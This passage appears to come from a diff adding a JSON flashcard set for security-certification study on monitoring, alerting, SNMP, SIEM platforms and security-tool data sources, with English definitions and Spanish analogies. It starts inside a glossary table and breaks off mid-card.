**SNMP** | Simple Network Management Protocol — collects/modifies managed device info |\n| **SNMP Manager** | The centralized node collecting/processing SNMP data from agents |\n| **SNMP Agent** | The background service on a managed device sending data to the manager |\n| **SET message** | SNMP manager-to-agent request to change a variable's value |\n| **GET message** | SNMP manager-to-agent request to retrieve a variable's value |\n| **TRAP message** | SNMP agent-to-manager unsolicited event notification |\n| **OID** | Object Identifier — unique number identifying an SNMP variable |\n| **MIB** | Management Information Base — translation file describing all OIDs |\n| **Variable binding** | Key-value pair format used to transmit SNMP trap data |\n| **Granular trap** | SNMP trap sending only the changed OID (bandwidth-efficient) |\n| **Verbose trap** | SNMP trap sending the full event payload (resource-intensive) |\n| **Community string** | Plaintext shared-secret access mechanism used in SNMPv1/v2 (insecure) |\n| **SIEM** | Security Information and Event Management — real-time security data correlation |\n| **Agent-based collection** | SIEM log collection method using an installed software agent |\n| **Agentless collection** | SIEM log collection method using standard protocols (SNMP, WMI) without agents |\n| **Splunk** | Commercial big-data SIEM with Search Processing Language |\n| **ELK / Elastic Stack** | Open-source SIEM stack: Elasticsearch, Logstash, Kibana, Beats |\n| **ArcSight** | Commercial SIEM focused on compliance reporting |\n| **QRadar** | IBM's commercial SIEM log management and analytics platform |\n| **DLP** | Data Loss Prevention — monitors/controls data to prevent breaches |\n| **NIDS** | Network Intrusion Detection System — passively detects and alerts on threats |\n| **NIPS** | Network Intrusion Prevention System — proactively blocks threats |\n| **ACL** | Access Control List — rule set used by firewalls to filter traffic |\n| **SCAP** | Security Content Automation Protocol — NIST standard for automating vulnerability/compliance management |\n| **OVAL** | Open Vulnerability and Assessment Language — XML schema for system security states |\n| **XCCDF** | Extensible Configuration Checklist Description Format — machine-readable best-practice checklists |\n| **ARF** | Asset Reporting Format — XML schema for asset/report relationships |\n| **CCE** | Common Configuration Enumeration — identifiers for configuration best practices |\n| **CPE** | Common Platform Enumeration — identifiers for hardware/OS/application platforms |\n| **CVE** | Common Vulnerabilities and Exposures — unique identifiers for known vulnerabilities |\n| **CVSS** | Common Vulnerability Scoring System — 0–10 severity scoring standard |\n| **Benchmark** | A set of configuration rules securing a system to a specific baseline |\n| **EternalBlue** | Nickname for CVE-2017-0144, an SMB vulnerability exploited by WannaCry |\n| **Full packet capture (FPC)** | Capturing entire packet contents, including header and payload |\n| **Flow analysis** | Collecting network traffic metadata instead of full packet contents |\n| **NetFlow** | Cisco-developed protocol for reporting network flow data |\n| **IPFIX** | IP Flow Information Export — the standardized evolution of NetFlow |\n| **Zeek** | Hybrid tool combining flow sampling with selective full packet capture |\n| **MRTG** | Multi Router Traffic Grapher — graphs traffic via SNMP polling |\n| **Single Pane of Glass (SPOG)** | A unified dashboard consolidating all security information and tools |"
+      }
+    ],
+    "flashcards": [
+      {
+        "name": "Monitoring Resources",
+        "definition": "The objective domain (4.4) covering the observation of systems, applications, and infrastructure to ensure optimal performance, security, and reliability across an organization's network.",
+        "analogy": "*Como un chequeo médico integral: no basta con medir solo el pulso, hay que revisar el corazón, los pulmones y la circulación por separado para tener el cuadro completo.*",
+        "raw_content": "* **Definition:** The objective domain (4.4) covering the observation of systems, applications, and infrastructure to ensure optimal performance, security, and reliability across an organization's network.\n\nMonitoring resources effectively is crucial for the smooth operation of any organizational network. This objective breaks monitoring into three distinct areas: **system monitoring**, **application monitoring**, and **infrastructure monitoring**, each covered as its own concept below.\n\n> *Como un chequeo médico integral: no basta con medir solo el pulso, hay que revisar el corazón, los pulmones y la circulación por separado para tener el cuadro completo.*"
+      },
+      {
+        "name": "Monitoring Resources: System Monitoring",
+        "definition": "The practice of observing a computer system's resource usage — including CPU utilization, memory consumption, disk usage, and network performance — to identify potential issues affecting stability or performance.",
+        "analogy": "*Es como revisar los signos vitales de una máquina: temperatura, presión y consumo de energía, para saber si algo anda mal antes de que se apague.*",
+        "raw_content": "* **Definition:** The practice of observing a computer system's resource usage — including CPU utilization, memory consumption, disk usage, and network performance — to identify potential issues affecting stability or performance.\n\nSystem monitoring tracks core resource metrics to catch problems before they escalate. On Windows, this can be observed locally using the **Performance Monitor** tool, which displays CPU, memory, and storage utilization in real time.\n\n> *Es como revisar los signos vitales de una máquina: temperatura, presión y consumo de energía, para saber si algo anda mal antes de que se apague.*"
+      },
+      {
+        "name": "Monitoring Resources: Baseline",
+        "definition": "A set of established performance metrics and data points representing the typical, expected behavior of a system, network, or application under normal operating conditions.",
+        "analogy": "*Es como saber cuál es tu temperatura corporal normal (37°C): sin ese número de referencia, no sabrías si una fiebre de 38.5°C es motivo de preocupación.*",
+        "raw_content": "* **Definition:** A set of established performance metrics and data points representing the typical, expected behavior of a system, network, or application under normal operating conditions.\n\nA baseline serves as the reference point against which current performance is measured. Deviations from baseline (e.g., consistently high CPU utilization) signal potential issues requiring investigation, enabling proactive troubleshooting rather than reactive firefighting.\n\n> *Es como saber cuál es tu temperatura corporal normal (37°C): sin ese número de referencia, no sabrías si una fiebre de 38.5°C es motivo de preocupación.*"
+      },
+      {
+        "name": "Monitoring Resources: Application Monitoring",
+        "definition": "Also called Application Performance Monitoring (APM), the practice of tracking errors, bottlenecks, response times, and other issues affecting a software application's performance or user experience.",
+        "analogy": "*Como cronometrar a un mesero en un restaurante: si tarda demasiado en traer los platos, algo en la cocina (el código) o en el personal (los recursos) necesita ajustarse.*",
+        "raw_content": "* **Definition:** Also called Application Performance Monitoring (APM), the practice of tracking errors, bottlenecks, response times, and other issues affecting a software application's performance or user experience.\n\nTools like **New Relic** or **AppDynamics** track response times, error rates, and key performance indicators. A slow response time may indicate a code problem or a need for additional server resources.\n\n> *Como cronometrar a un mesero en un restaurante: si tarda demasiado en traer los platos, algo en la cocina (el código) o en el personal (los recursos) necesita ajustarse.*"
+      },
+      {
+        "name": "Monitoring Resources: Infrastructure Monitoring",
+        "definition": "The observation of the performance and availability of an organization's physical and virtual infrastructure, including servers, networks, virtual machines, containers, cloud services, and hardware.",
+        "analogy": "*Como monitorear las tuberías y el cableado eléctrico de un edificio completo, no solo un cuarto: hay que vigilar toda la estructura que sostiene la operación.*",
+        "raw_content": "* **Definition:** The observation of the performance and availability of an organization's physical and virtual infrastructure, including servers, networks, virtual machines, containers, cloud services, and hardware.\n\nTools like **SolarWinds** or the **PRTG Network Monitor** provide visibility into network traffic, bandwidth utilization, and device status. A constantly overloaded switch may indicate the need for additional capacity or a misconfiguration.\n\n> *Como monitorear las tuberías y el cableado eléctrico de un edificio completo, no solo un cuarto: hay que vigilar toda la estructura que sostiene la operación.*\n\n---"
+      },
+      {
+        "name": "Alerting and Monitoring Activities",
+        "definition": "The objective domain (4.4) covering the set of operational activities — log aggregation, alerting, scanning, reporting, archiving, and alert response/remediation/validation — used to maintain system health and protect against threats.",
+        "analogy": "*Como el ciclo de vida de una investigación policial: recolectar evidencia, dar la alarma, buscar más pistas, escribir el reporte, archivar el caso y finalmente resolverlo y confirmar que se resolvió.*",
+        "raw_content": "* **Definition:** The objective domain (4.4) covering the set of operational activities — log aggregation, alerting, scanning, reporting, archiving, and alert response/remediation/validation — used to maintain system health and protect against threats.\n\nThese six activities work together as a continuous cycle: collect data, notify on issues, actively hunt for weaknesses, summarize findings, retain data for compliance, and close the loop by acting on and confirming fixes.\n\n> *Como el ciclo de vida de una investigación policial: recolectar evidencia, dar la alarma, buscar más pistas, escribir el reporte, archivar el caso y finalmente resolverlo y confirmar que se resolvió.*"
+      },
+      {
+        "name": "Alerting and Monitoring Activities: Log Aggregation",
+        "definition": "The process of collecting and consolidating log data from various sources into a centralized location to support troubleshooting, performance monitoring, security analysis, and compliance.",
+        "analogy": "*Como juntar todos los testimonios de testigos de un accidente en un solo expediente, en lugar de tenerlos dispersos en distintas libretas.*",
+        "raw_content": "* **Definition:** The process of collecting and consolidating log data from various sources into a centralized location to support troubleshooting, performance monitoring, security analysis, and compliance.\n\nAggregated logs provide a holistic view across systems, making it easier to correlate events and pinpoint root causes. Regulations like **GDPR** and **HIPAA** require maintaining comprehensive logs, which centralized aggregation helps satisfy for audits.\n\n> *Como juntar todos los testimonios de testigos de un accidente en un solo expediente, en lugar de tenerlos dispersos en distintas libretas.*"
+      },
+      {
+        "name": "Alerting and Monitoring Activities: Alerting",
+        "definition": "The activity of setting up notifications — delivered via email, text message, or push notification — to inform relevant stakeholders when specific predefined events, thresholds, or anomalies occur.",
+        "analogy": "*Como una alarma de incendios: no apaga el fuego por sí sola, pero avisa a tiempo para que alguien actúe antes de que se propague.*",
+        "raw_content": "* **Definition:** The activity of setting up notifications — delivered via email, text message, or push notification — to inform relevant stakeholders when specific predefined events, thresholds, or anomalies occur.\n\nAlerting enables proactive issue resolution (e.g., a CPU threshold alert) and faster security investigation (e.g., multiple failed login attempts). Some regulations require immediate notification of specific events, such as data breaches, to governmental agencies.\n\n> *Como una alarma de incendios: no apaga el fuego por sí sola, pero avisa a tiempo para que alguien actúe antes de que se propague.*"
+      },
+      {
+        "name": "Alerting and Monitoring Activities: Scanning",
+        "definition": "The activity of regularly examining systems, networks, or applications using specialized tools (e.g., Nessus, OpenVAS, Qualys) to identify vulnerabilities, misconfigurations, or other potential problems.",
+        "analogy": "*Como una inspección de rutina de un edificio: se revisan las tuberías, las salidas de emergencia y los planos de construcción por separado, cada uno con su propia lista de chequeo.*",
+        "raw_content": "* **Definition:** The activity of regularly examining systems, networks, or applications using specialized tools (e.g., Nessus, OpenVAS, Qualys) to identify vulnerabilities, misconfigurations, or other potential problems.\n\nScanning has three main types, each detailed below as its own concept: **vulnerability scans**, **configuration scans**, and **code scans**.\n\n> *Como una inspección de rutina de un edificio: se revisan las tuberías, las salidas de emergencia y los planos de construcción por separado, cada uno con su propia lista de chequeo.*"
+      },
+      {
+        "name": "Scanning: Vulnerability Scan",
+        "definition": "A scan that checks systems, networks, or applications for known vulnerabilities by comparing their current state against a database of Common Vulnerabilities and Exposures (CVE), maintained by the MITRE Corporation at cve.mitre.org.",
+        "analogy": "*Como comparar la lista de invitados de una fiesta contra una lista de criminales conocidos: cualquier coincidencia se marca de inmediato.*",
+        "raw_content": "* **Definition:** A scan that checks systems, networks, or applications for known vulnerabilities by comparing their current state against a database of Common Vulnerabilities and Exposures (CVE), maintained by the MITRE Corporation at cve.mitre.org.\n\nTools like **Nessus** or **OpenVAS** identify unpatched software, misconfigured services, or other exploitable weaknesses so administrators can patch, reconfigure, or apply compensating controls like a WAF.\n\n> *Como comparar la lista de invitados de una fiesta contra una lista de criminales conocidos: cualquier coincidencia se marca de inmediato.*"
+      },
+      {
+        "name": "Scanning: Configuration Scan",
+        "definition": "A scan that checks a system's configuration against best-practice guidelines or compliance standards to detect misconfigurations that could impact performance or security.",
+        "analogy": "*Como verificar que cada puerta y ventana de una casa esté correctamente cerrada según el manual del fabricante, no solo que existan.*",
+        "raw_content": "* **Definition:** A scan that checks a system's configuration against best-practice guidelines or compliance standards to detect misconfigurations that could impact performance or security.\n\nTools like **CIS-CAT** evaluate configurations against benchmarks such as the **CIS Controls** or **PCI DSS**. Discrepancies — open ports, weak access controls, non-compliant settings — are flagged for remediation.\n\n> *Como verificar que cada puerta y ventana de una casa esté correctamente cerrada según el manual del fabricante, no solo que existan.*"
+      },
+      {
+        "name": "Scanning: Code Scan",
+        "definition": "A scan that checks an application's source code for security vulnerabilities or coding errors, using static or dynamic code analysis techniques.",
+        "analogy": "*Como revisar los planos de un edificio antes de construirlo (análisis estático) y luego someterlo a una prueba sísmica real una vez construido (análisis dinámico).*",
+        "raw_content": "* **Definition:** A scan that checks an application's source code for security vulnerabilities or coding errors, using static or dynamic code analysis techniques.\n\nStatic tools like **Fortify** or **SonarQube** catch issues like SQL injection points, XSS vulnerabilities, or unsanitized variables during development. Dynamic techniques, such as penetration testing, complement static analysis by evaluating the application's behavior while running.\n\n> *Como revisar los planos de un edificio antes de construirlo (análisis estático) y luego someterlo a una prueba sísmica real una vez construido (análisis dinámico).*"
+      },
+      {
+        "name": "Alerting and Monitoring Activities: Reporting",
+        "definition": "The activity of generating summaries or detailed reports based on collected and analyzed data, providing insight into system performance, security incidents, and compliance status.",
+        "analogy": "*Como el informe final que un detective entrega a sus superiores: resume todo lo investigado en un documento claro y accionable.*",
+        "raw_content": "* **Definition:** The activity of generating summaries or detailed reports based on collected and analyzed data, providing insight into system performance, security incidents, and compliance status.\n\nTools like **Splunk** or **Sumo Logic** can generate reports that demonstrate compliance with data protection regulations and identify areas for continuous improvement.\n\n> *Como el informe final que un detective entrega a sus superiores: resume todo lo investigado en un documento claro y accionable.*"
+      },
+      {
+        "name": "Alerting and Monitoring Activities: Archiving",
+        "definition": "The activity of storing log data, performance data, incident data, and other important data for long-term retention or future reference, often to satisfy regulatory requirements.",
+        "analogy": "*Como guardar cajas de documentos importantes en una bodega en lugar de tirarlos, por si algún día una auditoría los pide de vuelta.*",
+        "raw_content": "* **Definition:** The activity of storing log data, performance data, incident data, and other important data for long-term retention or future reference, often to satisfy regulatory requirements.\n\nTools like **Amazon S3** or **Google Cloud Storage** are used for long-term archiving. **HIPAA**, for example, requires maintaining data for six years to prove compliance.\n\n> *Como guardar cajas de documentos importantes en una bodega en lugar de tirarlos, por si algún día una auditoría los pide de vuelta.*"
+      },
+      {
+        "name": "Alerting and Monitoring Activities: Alert Response and Remediation/Validation",
+        "definition": "The process of taking appropriate action in response to a received alert (investigation, escalation, or predefined procedure), resolving the identified issue (remediation), and confirming the fix was effective (validation).",
+        "analogy": "*Como cuando un médico no solo receta un tratamiento (remediación), sino que además pide un examen de seguimiento para confirmar que el paciente realmente sanó (validación).*",
+        "raw_content": "* **Definition:** The process of taking appropriate action in response to a received alert (investigation, escalation, or predefined procedure), resolving the identified issue (remediation), and confirming the fix was effective (validation).\n\nRemediation might involve patching software, reconfiguring services, or modifying code. Validation involves re-scanning or re-testing to confirm the vulnerability was fully eliminated — not just assumed fixed.\n\n> *Como cuando un médico no solo receta un tratamiento (remediación), sino que además pide un examen de seguimiento para confirmar que el paciente realmente sanó (validación).*"
+      },
+      {
+        "name": "Remediation: Quarantining",
+        "definition": "A remediation step that involves isolating a suspected malicious system, file, or network segment to prevent the spread of a threat and limit its potential impact.",
+        "analogy": "*Como aislar a un paciente contagioso en un cuarto separado del hospital mientras se determina qué enfermedad tiene.*",
+        "raw_content": "* **Definition:** A remediation step that involves isolating a suspected malicious system, file, or network segment to prevent the spread of a threat and limit its potential impact.\n\nFor example, a workstation suspected of malware infection is logically isolated from the rest of the network while the security team investigates and remediates.\n\n> *Como aislar a un paciente contagioso en un cuarto separado del hospital mientras se determina qué enfermedad tiene.*"
+      },
+      {
+        "name": "Remediation: Alert Tuning",
+        "definition": "A remediation step that adjusts alert parameters — thresholds, trigger conditions, or delivery methods — to reduce false positives and improve the relevance of generated alerts.",
+        "analogy": "*Como ajustar la sensibilidad de una alarma de auto para que no se dispare cada vez que pasa una motocicleta, sino solo ante un impacto real.*",
+        "raw_content": "* **Definition:** A remediation step that adjusts alert parameters — thresholds, trigger conditions, or delivery methods — to reduce false positives and improve the relevance of generated alerts.\n\nFor example, retuning a CPU alert to only trigger when utilization stays high for 30–60+ seconds reduces noise from brief, harmless spikes, helping prevent **alert fatigue**.\n\n> *Como ajustar la sensibilidad de una alarma de auto para que no se dispare cada vez que pasa una motocicleta, sino solo ante un impacto real.*\n\n---"
+      },
+      {
+        "name": "Simple Network Management Protocol (SNMP)",
+        "definition": "An internet protocol used for collecting and organizing information about managed devices on IP networks (routers, switches, firewalls, printers, servers, client devices) and for modifying that information to change device behavior.",
+        "analogy": "*Como el sistema de radio de una torre de control de aeropuerto: la torre (manager) se comunica con cada avión (agent) usando mensajes estandarizados para saber su estado y darle instrucciones.*",
+        "raw_content": "* **Definition:** An internet protocol used for collecting and organizing information about managed devices on IP networks (routers, switches, firewalls, printers, servers, client devices) and for modifying that information to change device behavior.\n\nSNMP architecture consists of **managers** and **agents** communicating through defined message types, with data organized via unique identifiers and stored in a standardized translation file.\n\n> *Como el sistema de radio de una torre de control de aeropuerto: la torre (manager) se comunica con cada avión (agent) usando mensajes estandarizados para saber su estado y darle instrucciones.*"
+      },
+      {
+        "name": "SNMP: Manager and Agent",
+        "definition": "The two architectural roles in SNMP — the manager is the centralized machine (often a server) that collects and processes information; the agent is a background service on each managed device that sends data to the manager at intervals or on request.",
+        "analogy": "*El manager es el jefe de una oficina que pide reportes; los agents son los empleados que recopilan su propia información y se la entregan cuando se les pide o de forma periódica.*",
+        "raw_content": "* **Definition:** The two architectural roles in SNMP — the manager is the centralized machine (often a server) that collects and processes information; the agent is a background service on each managed device that sends data to the manager at intervals or on request.\n\n> *El manager es el jefe de una oficina que pide reportes; los agents son los empleados que recopilan su propia información y se la entregan cuando se les pide o de forma periódica.*"
+      },
+      {
+        "name": "SNMP: Message Types (Set, Get, Trap)",
+        "definition": "The three message types used by SNMP managers and agents to exchange data: SET (manager-to-agent, changes a variable's value), GET (manager-to-agent, retrieves a variable's value), and TRAP (agent-to-manager, an unsolicited, asynchronous notification of a significant event).",
+        "analogy": "*SET y GET son como llamar a un empleado para pedirle un cambio o un reporte; TRAP es como cuando el empleado te llama por su cuenta para avisarte de una emergencia sin que se lo pidieras.*",
+        "raw_content": "* **Definition:** The three message types used by SNMP managers and agents to exchange data: SET (manager-to-agent, changes a variable's value), GET (manager-to-agent, retrieves a variable's value), and TRAP (agent-to-manager, an unsolicited, asynchronous notification of a significant event).\n\nTrap messages differ from SET/GET because the agent sends them without being asked, notifying the manager of events like uptime changes, configuration changes, or unexpected link downtime in near real time.\n\n> *SET y GET son como llamar a un empleado para pedirle un cambio o un reporte; TRAP es como cuando el empleado te llama por su cuenta para avisarte de una emergencia sin que se lo pidieras.*"
+      },
+      {
+        "name": "SNMP: OID and MIB",
+        "definition": "An Object Identifier (OID) is a unique number identifying a specific variable that can be read or set via SNMP; the Management Information Base (MIB) is the translation file that stores and describes the hierarchical structure of all OIDs for a device.",
+        "analogy": "*El OID es el número de placa de un empleado específico; el MIB es el directorio completo de la empresa que explica quién es cada número de placa y qué hace.*",
+        "raw_content": "* **Definition:** An Object Identifier (OID) is a unique number identifying a specific variable that can be read or set via SNMP; the Management Information Base (MIB) is the translation file that stores and describes the hierarchical structure of all OIDs for a device.\n\nBecause the MIB already contains full details about each OID, SNMP trap messages can send just the changed value for a specific OID instead of retransmitting all known data — conserving bandwidth.\n\n> *El OID es el número de placa de un empleado específico; el MIB es el directorio completo de la empresa que explica quién es cada número de placa y qué hace.*"
+      },
+      {
+        "name": "SNMP: Variable Binding",
+        "definition": "The key-value pair configuration used to store and transmit SNMP trap data, associating each piece of information (e.g., SiteName, Criticality, Severity) with its corresponding value.",
+        "analogy": "*Como una ficha médica donde cada dato viene etiquetado: Nombre: Juan, Edad: 30, Presión: Alta — cada etiqueta va pegada a su valor correspondiente.*",
+        "raw_content": "* **Definition:** The key-value pair configuration used to store and transmit SNMP trap data, associating each piece of information (e.g., SiteName, Criticality, Severity) with its corresponding value.\n\nExample variable bindings: `SiteName: PR-Branch`, `Criticality: High`, `Severity: Low`, `Alarm Description: High temperature`.\n\n> *Como una ficha médica donde cada dato viene etiquetado: Nombre: Juan, Edad: 30, Presión: Alta — cada etiqueta va pegada a su valor correspondiente.*"
+      },
+      {
+        "name": "SNMP: Granular vs Verbose Traps",
+        "definition": "Two methods of encoding SNMP trap data — granular traps send only a unique OID representing the changed value (bandwidth-efficient), while verbose traps send the full payload of information about the alert or event (resource-intensive).",
+        "analogy": "*Granular es como enviar un mensaje de texto corto avisando \"cambio de estado\"; verbose es como enviar un video completo explicando cada detalle del cambio.*",
+        "raw_content": "* **Definition:** Two methods of encoding SNMP trap data — granular traps send only a unique OID representing the changed value (bandwidth-efficient), while verbose traps send the full payload of information about the alert or event (resource-intensive).\n\n| Trap Type | Data Sent | Bandwidth Impact |\n| --------- | --------- | ----------------- |\n| **Granular** | Only the changed OID | Low — conserves resources |\n| **Verbose** | Full payload/context of the event | High — more resource use |\n\n> *Granular es como enviar un mensaje de texto corto avisando \"cambio de estado\"; verbose es como enviar un video completo explicando cada detalle del cambio.*"
+      },
+      {
+        "name": "SNMP: Versions and Security",
+        "definition": "The three SNMP versions (v1, v2, v3) with differing security levels; v1 and v2 rely on plaintext community strings as their only access control, while v3 adds integrity (hashing), authentication (source validation), and confidentiality (encryption).",
+        "analogy": "*v1 y v2 son como una puerta con una llave universal escrita en un papel pegado a la puerta; v3 es como cambiar a una cerradura biométrica cifrada con permisos individuales por persona.*",
+        "raw_content": "* **Definition:** The three SNMP versions (v1, v2, v3) with differing security levels; v1 and v2 rely on plaintext community strings as their only access control, while v3 adds integrity (hashing), authentication (source validation), and confidentiality (encryption).\n\nDefault community strings (public read-only, private read-write) in v1/v2 are a major security risk because they are stored and transmitted in plain text. SNMPv3 encrypts using DES (56-bit, weak) by default, upgradeable to 3DES or AES if device firmware supports it. SNMPv3 also groups components into entities with distinct read, write, or read-write authorizations.\n\n> *v1 y v2 son como una puerta con una llave universal escrita en un papel pegado a la puerta; v3 es como cambiar a una cerradura biométrica cifrada con permisos individuales por persona.*\n\n⚠️ **Exam Tip:** SNMPv1 and v2 use insecure plaintext community strings. Always prefer **SNMPv3** for integrity, authentication, and confidentiality.\n\n---"
+      },
+      {
+        "name": "Security Information and Event Management (SIEM)",
+        "definition": "A solution — deployed as software, hardware appliance, or managed service — that provides real-time or near real-time analysis of security alerts generated by network hardware and applications, by aggregating and correlating log data from across the entire organization.",
+        "analogy": "*Como un detective que junta pistas de cámaras de seguridad, testigos y registros telefónicos dispersos, y solo al cruzarlos todos descubre que algo no cuadra — cada pista por separado parecía inofensiva.*",
+        "raw_content": "* **Definition:** A solution — deployed as software, hardware appliance, or managed service — that provides real-time or near real-time analysis of security alerts generated by network hardware and applications, by aggregating and correlating log data from across the entire organization.\n\nA SIEM's core value is **correlation**: connecting disparate log sources (e.g., a VPN login log and a physical badge-access log) to reveal issues that would be invisible when reviewed separately, such as impossible travel (a user appearing to be in two places at once).\n\n> *Como un detective que junta pistas de cámaras de seguridad, testigos y registros telefónicos dispersos, y solo al cruzarlos todos descubre que algo no cuadra — cada pista por separado parecía inofensiva.*"
+      },
+      {
+        "name": "SIEM: Agent-Based vs Agentless Collection",
+        "definition": "Two methods of log collection used by SIEMs — agent-based installs a small software agent on each monitored system for real-time, detailed data collection; agentless collects log data directly using standard protocols like SNMP or WMI without installing software.",
+        "analogy": "*Agent-based es como tener un reportero personal en cada oficina; agentless es como hacer llamadas periódicas para preguntar qué está pasando, sin tener a nadie físicamente ahí.*",
+        "raw_content": "* **Definition:** Two methods of log collection used by SIEMs — agent-based installs a small software agent on each monitored system for real-time, detailed data collection; agentless collects log data directly using standard protocols like SNMP or WMI without installing software.\n\n| Method | Data Detail | Real-Time | Maintenance |\n| ------ | ----------- | --------- | ----------- |\n| **Agent-based** | More detailed | Yes | Requires install/upkeep on each system |\n| **Agentless** | Less detailed | Slower | Lower maintenance cost |\n\n> *Agent-based es como tener un reportero personal en cada oficina; agentless es como hacer llamadas periódicas para preguntar qué está pasando, sin tener a nadie físicamente ahí.*"
+      },
+      {
+        "name": "SIEM: Deployment Considerations",
+        "definition": "The seven planning steps required to effectively deploy a SIEM: logging relevant events, establishing scope, developing threat-defining use cases, planning incident response actions, establishing a ticketing process, scheduling regular threat hunting, and providing an evidence trail for auditors.",
+        "analogy": "*Como planear la apertura de una nueva sucursal bancaria: primero decides qué vigilar, luego documentas las reglas, preparas protocolos de emergencia, un sistema de reportes de incidentes, rondas de inspección regulares, y un archivo listo para auditorías.*",
+        "raw_content": "* **Definition:** The seven planning steps required to effectively deploy a SIEM: logging relevant events, establishing scope, developing threat-defining use cases, planning incident response actions, establishing a ticketing process, scheduling regular threat hunting, and providing an evidence trail for auditors.\n\n1. Log all relevant events; filter out irrelevant data.\n2. Establish and document the scope of monitored events.\n3. Develop use cases to define what constitutes a threat.\n4. Plan pre-defined incident response actions for given threats.\n5. Establish a ticketing process to track flagged events.\n6. Schedule regular threat hunting to catch what alerts missed.\n7. Provide auditors and analysts an accessible evidence trail.\n\n> *Como planear la apertura de una nueva sucursal bancaria: primero decides qué vigilar, luego documentas las reglas, preparas protocolos de emergencia, un sistema de reportes de incidentes, rondas de inspección regulares, y un archivo listo para auditorías.*"
+      },
+      {
+        "name": "SIEM: Common SIEM Solutions",
+        "definition": "Commercial and open-source SIEM platforms widely used in the industry, including Splunk, ELK/Elastic Stack, ArcSight, and QRadar.",
+        "analogy": "*Elegir un SIEM es como elegir un idioma: al final del día, casi siempre usarás el que ya habla tu empresa, no necesariamente el \"mejor\" en abstracto.*",
+        "raw_content": "* **Definition:** Commercial and open-source SIEM platforms widely used in the industry, including Splunk, ELK/Elastic Stack, ArcSight, and QRadar.\n\n| Solution | Vendor/Type | Key Characteristic |\n| -------- | ----------- | ------------------- |\n| **Splunk** | Commercial | Market-leading; connectors for most OS/app formats; Search Processing Language; local or cloud |\n| **ELK / Elastic Stack** | Open-source | Four components: Elasticsearch (query/analytics), Logstash (log collection/normalization), Kibana (visualization), Beats (endpoint collection agents) |\n| **ArcSight** | Commercial | SIEM log management/analytics; compliance reporting (HIPAA, SOX, PCI DSS) |\n| **QRadar** | Commercial (IBM) | SIEM log management, analytics, and compliance reporting platform |\n\n> *Elegir un SIEM es como elegir un idioma: al final del día, casi siempre usarás el que ya habla tu empresa, no necesariamente el \"mejor\" en abstracto.*\n\n---"
+      },
+      {
+        "name": "Data from Security Tools",
+        "definition": "The objective domain (4.4) covering the different categories of log, event, and incident data generated by core security tools — antivirus, DLP, NIDS/NIPS, firewalls, and vulnerability scanners — that feed into a SIEM for consolidated analysis.",
+        "analogy": "*Como los sentidos del cuerpo humano: la vista, el oído y el tacto capturan información distinta, pero es el cerebro (el SIEM) el que junta todo para entender la situación completa.*",
+        "raw_content": "* **Definition:** The objective domain (4.4) covering the different categories of log, event, and incident data generated by core security tools — antivirus, DLP, NIDS/NIPS, firewalls, and vulnerability scanners — that feed into a SIEM for consolidated analysis.\n\nEach tool generates a different \"slice\" of visibility; only when consolidated in a SIEM do these slices combine into a holistic security posture view.\n\n> *Como los sentidos del cuerpo humano: la vista, el oído y el tacto capturan información distinta, pero es el cerebro (el SIEM) el que junta todo para entender la situación completa.*"
+      },
+      {
+        "name": "Data Sources: Antivirus Software",
+        "definition": "A fundamental security tool that protects systems against malware (viruses, worms, trojans, ransomware, spyware) and generates data such as malware detection logs, scan results, and update status.",
+        "analogy": "*Como el sistema inmunológico de un cuerpo: no solo combate la infección, también registra cuántas veces atacó y qué tan grave fue cada episodio.*",
+        "raw_content": "* **Definition:** A fundamental security tool that protects systems against malware (viruses, worms, trojans, ransomware, spyware) and generates data such as malware detection logs, scan results, and update status.\n\nIf a system repeatedly reports malware infections, sending that data to a SIEM helps determine whether the issue is isolated or spreading — a sign of a larger coordinated attack.\n\n> *Como el sistema inmunológico de un cuerpo: no solo combate la infección, también registra cuántas veces atacó y qué tan grave fue cada episodio.*"
+      },
+      {
+        "name": "Data Sources: Data Loss Prevention (DLP)",
+        "definition": "Systems that monitor and control data at endpoints, in network traffic, and in cloud storage to prevent potential data breaches, generating data about leak attempts, policy violations, and suspicious user activity.",
+        "analogy": "*Como un guardia de aduana que revisa las maletas antes de que salgan del país: si detecta algo prohibido, lo detiene antes de que cruce la frontera.*",
+        "raw_content": "* **Definition:** Systems that monitor and control data at endpoints, in network traffic, and in cloud storage to prevent potential data breaches, generating data about leak attempts, policy violations, and suspicious user activity.\n\nExample: a DLP system flags an attempt to email a list of client names and contact information outside the organization, alerting the security team for timely corrective action.\n\n> *Como un guardia de aduana que revisa las maletas antes de que salgan del país: si detecta algo prohibido, lo detiene antes de que cruce la frontera.*"
+      },
+      {
+        "name": "Data Sources: NIDS and NIPS",
+        "definition": "Network Intrusion Detection Systems (NIDS) passively monitor network traffic and generate alerts on detected threats; Network Intrusion Prevention Systems (NIPS) proactively block or prevent those threats from accessing the network.",
+        "analogy": "*NIDS es como una cámara de seguridad que solo graba y avisa; NIPS es como un guardia que además interviene físicamente para detener al intruso.*",
+        "raw_content": "* **Definition:** Network Intrusion Detection Systems (NIDS) passively monitor network traffic and generate alerts on detected threats; Network Intrusion Prevention Systems (NIPS) proactively block or prevent those threats from accessing the network.\n\nData from both — detected threats, blocked traffic, network anomalies — feeds a SIEM to reveal patterns of malicious activity and measure the effectiveness of prevention measures.\n\n> *NIDS es como una cámara de seguridad que solo graba y avisa; NIPS es como un guardia que además interviene físicamente para detener al intruso.*"
+      },
+      {
+        "name": "Data Sources: Firewalls",
+        "definition": "Devices that serve as a barrier between trusted internal and untrusted external networks, filtering traffic based on predetermined Access Control Lists (ACLs) and generating logs of allowed/blocked traffic, rule changes, and detected threats.",
+        "analogy": "*Como el portero de un edificio con una lista de invitados: registra a quién dejó pasar, a quién rechazó y cualquier intento sospechoso de entrada.*",
+        "raw_content": "* **Definition:** Devices that serve as a barrier between trusted internal and untrusted external networks, filtering traffic based on predetermined Access Control Lists (ACLs) and generating logs of allowed/blocked traffic, rule changes, and detected threats.\n\nExample: a port scan against a web server (probing ports 0–1023) shows up in firewall logs as reconnaissance activity, an early indicator of a potential attack.\n\n> *Como el portero de un edificio con una lista de invitados: registra a quién dejó pasar, a quién rechazó y cualquier intento sospechoso de entrada.*"
+      },
+      {
+        "name": "Data Sources: Vulnerability Scanners",
+        "definition": "Tools that identify security weaknesses in a system — missing patches, misconfigurations, known vulnerabilities — and generate data about the vulnerabilities found, their severity, and recommended remediation.",
+        "analogy": "*Como un inspector de salud que revisa un restaurante y entrega una lista de todo lo que está mal, ordenada de lo más urgente a lo menos urgente.*",
